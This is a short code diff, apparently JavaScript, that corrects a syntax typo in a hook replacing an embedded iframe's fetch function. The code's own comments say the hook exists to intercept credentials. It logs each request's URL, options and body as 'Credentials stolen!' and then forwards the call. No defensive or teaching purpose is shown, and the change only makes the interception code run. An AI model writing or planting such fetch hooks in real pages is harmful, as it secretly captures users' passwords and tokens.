@@ -16,7 +16,7 @@
         // Monkey-patching the fetch API to intercept credentials
         iframeWindow.fetch = async function(url, options) {
           console.log('Intercepted:', url, options);
-          console,.log(options.body); // Credentials stolen!
+          console.log(options.body); // Credentials stolen!
           return originalFetch(url, options);
         };
       } catch (e) {
